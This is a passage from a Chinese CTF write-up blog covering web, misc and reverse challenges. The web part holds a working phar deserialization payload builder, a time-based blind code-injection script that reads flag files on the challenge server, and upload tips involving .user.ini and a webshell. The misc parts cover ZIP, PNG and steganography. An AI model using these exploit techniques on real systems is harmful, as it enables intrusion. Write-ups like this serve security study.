class="string">&#x27;status_code&#x27;</span> =&gt; $status_code,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span> =&gt; $msg,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>存在任意文件写，可以控制name为/…/ 跳转上一级</p>
<p>直接上传user。ini和一句话shell 就行</p>
<p>flag在环境变量</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/9dfadd35-1a34-433d-b1e9-05935dd74005.png"
                        alt=""
                 ></p>
<h3 id="什么文件上传？"><strong>什么文件上传？</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/643f0a7f-0ad2-41f4-9fca-dc582f6cc131.png"
                        alt=""
                 ></p>
<p>爆破一下上传后缀 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fb84a46f-29a9-497c-b3e7-4281d5f419d8.png"
                        alt=""
                 ></p>
<p>直接打phar反序列化就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="comment">// error_reporting(0);</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">        <span class="comment">// public $try;</span></span><br><span class="line">        <span class="comment">// public function __construct()</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// // &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">        <span class="comment">// public function __construct()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">        <span class="comment">// public function __invoke()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">//     echo $this-&gt;good;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// public function __get($arg1)&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// public function __set($arg1, $arg2) &#123;</span></span><br><span class="line">        <span class="comment">//     if ($this-&gt;out-&gt;useful7) &#123;</span></span><br><span class="line">        <span class="comment">//         echo &quot;Seven is my lucky number&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">//         system(&#x27;whoami&#x27;);</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// system($_POST[&quot;wow&quot;]);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// public function __destruct()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;no = &quot;no&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;no;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if (file_exists($_GET[&#x27;filename&#x27;]))&#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;Focus on the previous step!&lt;br&gt;&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// else&#123;</span></span><br><span class="line">    <span class="comment">//     $data=substr($_GET[&#x27;filename&#x27;],0,-4);</span></span><br><span class="line">    <span class="comment">//     unserialize(best64_decode(str: $data));</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo urlencode(serialize($payload));</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/3fa7784f-a2fa-4e8a-81b6-44d63a630604.png"
                        alt=""
                 ></p>
<h3 id="熟悉的配方，熟悉的味道"><strong>熟悉的配方，熟悉的味道</strong></h3>
<p>盲注即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import <span class="keyword">string</span></span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://node1.tgctf.woooo.tech:31931/&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> strr in <span class="keyword">string</span>.printable:</span><br><span class="line">        shell = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import time</span></span><br><span class="line"><span class="string">a = os.popen(&#x27;cat /fl*&#x27;).read()</span></span><br><span class="line"><span class="string">if len(a) &gt; &#123;i&#125; and a[&#123;i&#125;] == &#x27;&#123;strr&#125;&#x27;:</span></span><br><span class="line"><span class="string">    time.sleep(2)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        start = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">       </span><br><span class="line">        requests.<span class="title function_ invoke__">post</span>(url, data=&#123;<span class="string">&#x27;expr&#x27;</span>: shell&#125;)</span><br><span class="line">        </span><br><span class="line">        end = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2</span>:</span><br><span class="line">            ans += strr</span><br><span class="line">            <span class="keyword">print</span>(ans)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/311cf1ea-6def-4849-8873-9f7093667445.png"
                        alt=""
                 ></p>
<h3 id="直面天命（复仇）"><strong>直面天命（复仇）</strong></h3>
<p>一把梭即可 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/d419f3ad-f018-41de-9b87-f899f38411aa.png"
                        alt=""
                 ></p>
<h3 id="AAA偷渡阴平（复仇）"><strong>AAA偷渡阴平（复仇）</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fbc10e99-2f95-4721-87e5-e9badfcae3b2.png"
                        alt=""
                 ></p>
<h3 id="什么文件上传？（复仇）"><strong>什么文件上传？（复仇）</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/867c757a-3c0a-40d4-9f83-c3e038bf9619.png"
                        alt=""
                 ></p>
<h2 id="Misc：">Misc：</h2>
<h3 id="简单签到，关注：”杭师大网安“谢谢喵🐱">简单签到，关注：”杭师大网安“谢谢喵🐱</h3>
<p>关注公众号得flag。</p>
<h3 id="ez-zip">ez_zip</h3>
<p>爆破得到密码是20250412，解压后得到一个压缩包和一个sh512.txt，把txt中的那句话sha512一下，deflate明文攻击。 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/987ea59f-599d-4926-924a-a29bc18b7015.png"
                        alt=""
                 >根据数据存储区修复了一下压缩包</p>
<p>用Bandizip无密码快速压缩一个例子，然后对照着把压缩包修复一下就行</p>
<p>dirEntry的flag.txt应该是少东西了，需要我们手动补上</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/5045fc70-5cdf-4ff4-9aca-2b71aac86caf.png"
                        alt="5045fc70-5cdf-4ff4-9aca-2b71aac86caf"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c298ce10-0d45-451a-ab91-a4f412cd7f24.png"
                        alt="c298ce10-0d45-451a-ab91-a4f412cd7f24"
                 ></p>
<p>修复完成后打开即可得到flag：TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/18fe7e85-2673-43d9-8f03-d7ec5b2c6e25.png"
                        alt="18fe7e85-2673-43d9-8f03-d7ec5b2c6e25"
                 ></p>
<h3 id="TeamGipsy-ctfer"><strong>TeamGipsy&amp;ctfer</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1ac79dc0-4137-458a-b1e4-f9c287333d41.png"
                        alt=""
                 >桌面上有个mimi.txt，发现出题人用Docker起了一个MySQL，直接去/var/lib/docker目录下翻</p>
<p>发现在/var/lib/docker/overlay2/6ac971c2de3baa602bb4335d6899bbf1963140364ce248decc9557b2f49139f9/diff/root/.mysql_history中就有flag：HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4e32d7ce-031a-4e80-90a6-5d2b10178ba7.png"
                        alt=""
                 ></p>
<h3 id="你能发现图中的秘密吗？"><strong>你能发现图中的秘密吗？</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6e51df8a-8635-41d0-8c92-1c1e0171107e.png"
                        alt="" title=" =1531x125"
                 ></p>
<p>解压得到两张新的图片，第一张的左上角有第二部分的flag：</p>
<p>flag2=_attentive_and_conscientious}</p>
<p>用010打开final_challenge2.png，发现有一块IDAT块不太正常</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6d5cd91f-edde-4018-9169-05b284a1d7f0.png"
                        alt="6d5cd91f-edde-4018-9169-05b284a1d7f0"
                 ></p>
<p>提取出来，补上PNG文件头尾，然后爆破宽高即可得到另一段flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/256ea54c-f030-4f11-8014-7c32fd29e67c.png"
                        alt="256ea54c-f030-4f11-8014-7c32fd29e67c"
                 ></p>
<p>Tips：这里要注意把IDAT的前四个字节也一起复制过来，并且保持不变</p>
<p>因为四字节代表的是数据长度，这里如果出错，图片的数据长度就错了，因此再爆破宽高也没用了</p>
<p>两段flag合起来就是最后的flag：flag{you_are_so_attentive_and_conscientious}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/948d611c-6920-4fb4-8b49-17f806516925.png"
                        alt=""
                 ></p>
<h3 id="next-is-the-end"><strong>next is the end</strong></h3>
<p>直接脚本就行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">def <span class="title function_">traverse</span>(path):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    递归遍历目录：</span></span><br><span class="line"><span class="string">      1. 如果当前目录中存在名为 &#x27;next_or_end&#x27; 的子目录，则进入该目录；</span></span><br><span class="line"><span class="string">      2. 否则：</span></span><br><span class="line"><span class="string">         - 如果目录中只有一个项目且该项目为文件，则返回该文件路径；</span></span><br><span class="line"><span class="string">         - 如果只有一个项目但是目录，则继续进入；</span></span><br><span class="line"><span class="string">         - 如果目录中有多个项目，则报错无法确定正确路径。</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        # 若当前路径不是目录，则到达最终目标（通常是文件）</span><br><span class="line">        <span class="keyword">if</span> not os.<span class="property">path</span>.<span class="title function_">isdir</span>(path):</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        items = os.<span class="title function_">listdir</span>(path)</span><br><span class="line">        # 如果当前目录中有 <span class="string">&#x27;next_or_end&#x27;</span> 文件夹，则进入该目录</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;next_or_end&quot;</span> <span class="keyword">in</span> <span class="attr">items</span>:</span><br><span class="line">            path = os.<span class="property">path</span>.<span class="title function_">join</span>(path, <span class="string">&quot;next_or_end&quot;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            # 当前目录没有 <span class="string">&#x27;next_or_end&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="title function_">len</span>(items) == <span class="number">1</span>:</span><br><span class="line">                next_path = os.<span class="property">path</span>.<span class="title function_">join</span>(path, items[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> os.<span class="property">path</span>.<span class="title function_">isdir</span>(next_path):</span><br><span class="line">                    # 如果唯一的项目还是目录，则继续进入</span><br><span class="line">                    path = next_path</span><br><span class="line">                elif os.<span class="property">path</span>.<span class="title function_">isfile</span>(next_path):</span><br><span class="line">                    # 如果唯一的项目是文件，则返回</span><br><span class="line">                    <span class="keyword">return</span> next_path</span><br><span class="line">                <span class="attr">else</span>:</span><br><span class="line">                    <span class="title function_">print</span>(f<span class="string">&quot;遇到未知类型：&#123;next_path&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">None</span></span><br><span class="line">            <span class="attr">else</span>:</span><br><span class="line">                <span class="title function_">print</span>(f<span class="string">&quot;无法确定路径：目录 &#x27;&#123;path&#125;&#x27; 中存在多个项目：&#123;items&#125;&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # 从命令行获取起始目录，若未传参数则默认为当前目录</span><br><span class="line">    start_path = sys.<span class="property">argv</span>[<span class="number">1</span>] <span class="keyword">if</span> <span class="title function_">len</span>(sys.<span class="property">argv</span>) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    result = <span class="title function_">traverse</span>(start_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">result</span>:</span><br><span class="line">        <span class="title function_">print</span>(f<span class="string">&quot;最终目标路径：&#123;result&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.<span class="property">path</span>.<span class="title function_">isfile</span>(result):</span><br><span class="line">            # 如果目标为文件，读取并打印文件内容</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="title function_">open</span>(result, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">                    content = f.<span class="title function_">read</span>()</span><br><span class="line">                <span class="title function_">print</span>(<span class="string">&quot;文件内容如下：&quot;</span>)</span><br><span class="line">                <span class="title function_">print</span>(content)</span><br><span class="line">            except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">                <span class="title function_">print</span>(f<span class="string">&quot;读取文件时出错：&#123;e&#125;&quot;</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&quot;最终目标不是一个普通文件。&quot;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;未能找到最终目标。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>看到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/a0c5ea4e-7705-4e4a-8d64-5351c9c7ef5e.png"
                        alt="" title=" =1697x701"
                 ></p>
<h3 id="where-it-is-osint">where it is(osint)</h3>
<p>谷歌识图</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/b7821666-222f-4a79-b959-dc9bd48ce7a0.png"
                        alt="" title=" =1780x1183"
                 ></p>
<p>点进去发现</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/d05fc578-659e-44f4-8a8e-b6cd840a6508.png"
                        alt="" title=" =1693x1019"
                 ></p>
<p>站点就是这个：港墘站</p>
<h3 id="你的运气是好是坏？"><strong>你的运气是好是坏？</strong></h3>
<p>笑死我了flag直接一试就试出来了：114514</p>
<h3 id="这是啥o-o"><strong>这是啥o_o</strong></h3>
<p>下载得到一个无后缀的文件，文件头发现是gif，改成gif后拖进ps里看，发现最后几帧有散开的汉信码碎片。修复如下：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/39f90506-aef0-4283-a135-6317525f3e77.png"
                        alt="" title=" =749x713"
                 ></p>
<p>扫码得到：time is your fortune ,efficiency is your life</p>
<p>猜测是帧间隔隐写，用puzzlesolver提出帧间隔放入python转ASCII码，得到flag</p>
<blockquote>
<p>a= [‘840’, ‘710’, ‘670’, ‘840’, ‘700’, ‘1230’, ‘890’, ‘1110’, ‘1170’, ‘950’, ‘990’, ‘970’, ‘1170’, ‘1030’, ‘1040’, ‘1160’, ‘950’, ‘1170’, ‘1120’, ‘950’, ‘1190’, ‘1050’, ‘1160’, ‘1040’, ‘950’, ‘1160’, ‘1050’, ‘1090’, ‘1010’, ‘330’, ‘1250’]</p>
<p>s = ‘’</p>
<p>for i in a:</p>
<p>s+=chr(int(i)//10)</p>
<p>print(s)</p>
</blockquote>
<p>TGCTF{You_caught_up_with_time!}</p>
<h2 id="Reverse：">Reverse：</h2>
<h3 id="XTEA">XTEA</h3>
<p>大端序密文输入。</p>
<p>delta没给，直接爆破0—&gt;0xffffffff</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 